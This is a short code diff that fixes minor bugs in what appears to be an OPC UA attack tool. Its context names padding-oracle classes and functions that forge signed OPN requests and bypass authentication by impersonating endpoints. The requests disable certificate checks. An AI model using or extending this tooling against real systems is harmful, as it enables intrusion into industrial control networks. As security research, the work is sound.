@@ -251,7 +251,9 @@ def https_exchange(
   }
   if nonce_policy is not None:
     headers['OPCUA-SecurityPolicy'] =  f'http://opcfoundation.org/UA/SecurityPolicy#{nonce_policy.value}'
-    
+  
+  if url.startswith('opc.http'):
+    url = url[4:]
   reqbody = reqfield.to_bytes(reqfield.create(**req_data))
   http_resp = requests.post(url, verify=False, headers=headers, data=reqbody)
   return respfield.from_bytes(http_resp.content)[0]
@@ -605,7 +607,7 @@ class OPNPaddingOracle(PaddingOracle):
     
 class PasswordPaddingOracle(PaddingOracle):
   @classmethod
-  def _preferred_tokenpolicy(_, endpoint):
+  def _preferred_tokenpolicy(_, endpoint):    
     policies = sorted(endpoint.userIdentityTokens, reverse=True, 
       key=lambda t: (
         t.tokenType == UserTokenType.USERNAME, 
@@ -1130,7 +1132,7 @@ def bypass_opn(impersonate_endpoint : endpointDescription.Type, login_endpoint :
   else:
     opn_req = forge_opn_request(impersonate_endpoint, login_endpoint, opn_oracle, password_oracle)
     log(f'Storing signed+encrypted OPN request in cache file {cache}.')
-    cachedata[cachekey] = b64encode(opn_req.to_bytes())
+    cachedata[cachekey] = b64encode(opn_req.to_bytes()).decode()
     with cache.open('w') as outfile:
       json.dump(cachedata, outfile)
   
